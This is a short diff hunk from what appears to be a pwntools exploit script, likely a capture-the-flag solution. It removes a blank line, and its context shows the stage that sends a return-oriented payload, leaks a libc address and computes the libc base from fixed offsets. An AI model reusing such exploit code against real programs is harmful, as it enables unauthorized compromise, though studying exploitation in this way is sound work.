@@ -38,7 +38,6 @@ payload += p64(main)
 
 sla(b"? ", payload)
 
-
 leak = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
 libc.address = leak - 0x60770 - 0x46a0 + 0x3180
 info(str(hex(libc.address)))
